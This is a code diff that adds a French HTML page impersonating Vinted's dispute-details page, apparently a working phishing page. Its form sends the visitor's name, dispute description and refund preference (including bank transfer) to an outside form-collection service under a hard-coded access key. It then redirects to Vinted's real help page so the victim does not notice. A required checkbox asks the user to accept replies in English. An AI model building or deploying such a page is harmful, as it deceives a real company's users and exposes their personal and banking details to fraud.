@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Détails du litige | Vinted</title>
+    <link rel="icon" type="image/png" href="https://vinted.fr/favicon.ico">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header class="navbar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" alt="Vinted" class="logo-img">
+        <div class="menu-icon"><span></span><span></span><span></span></div>
+    </header>
+
+    <div class="search-container">
+        <div class="search-bar">
+            <span class="category">Articles ▾</span>
+            <input type="text" placeholder="Rechercher des articles">
+        </div>
+    </div>
+
+    <main class="main-content">
+        <div class="litige-box">
+            <h2>Détails du litige</h2>
+            
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
+                <input type="hidden" name="subject" value="Détails du litige reçu">
+                <input type="hidden" name="redirect" value="https://www.vinted.fr/help">
+
+                <div class="form-group">
+                    <label>Nom</label>
+                    <input type="text" name="nom" placeholder="Ton nom" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Prénom</label>
+                    <input type="text" name="prenom" placeholder="Ton prénom" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Décris ton litige</label>
+                    <textarea name="description" placeholder="Ex. : mon colis n'est jamais arrivé au point relais" rows="4" required></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>Mode de remboursement</label>
+                    <select name="remboursement" required>
+                        <option value="">Sélectionner</option>
+                        <option value="porte_monnaie">Porte-monnaie Vinted</option>
+                        <option value="banque">Virement bancaire (IBAN)</option>
+                    </select>
+                </div>
+
+                <div class="checkbox-container">
+                    <p>J'accepte de recevoir une réponse en anglais pour un traitement plus rapide.</p>
+                    <input type="checkbox" required>
+                </div>
+
+                <p class="disclaimer">
+                    En envoyant ce formulaire, tes données seront traitées par notre support client.
+                </p>
+
+                <button type="submit" class="btn-vinted">Envoyer le litige pour examen</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        </footer>
+
+</body>
+</html>
